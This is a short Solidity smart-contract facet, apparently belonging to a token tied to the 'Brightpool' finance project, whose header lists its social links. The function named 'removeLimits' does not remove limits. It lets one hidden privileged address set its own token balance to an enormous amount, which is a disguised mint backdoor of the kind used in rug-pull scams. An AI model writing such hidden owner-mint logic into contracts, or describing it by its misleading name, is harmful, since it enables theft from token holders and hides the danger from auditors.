/*  
   * SPDX-License-Identifier: MIT

     // Telegram: https://t.me/brightpoolfinance
    // Twitter: https://twitter.com/BrightpoolX
    // Website: https://brightpool.finance/
    // Discord: https://discord.com/invite/Up84GAStR2
    // Medium:  https://medium.com/@Brightpool.finance
*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
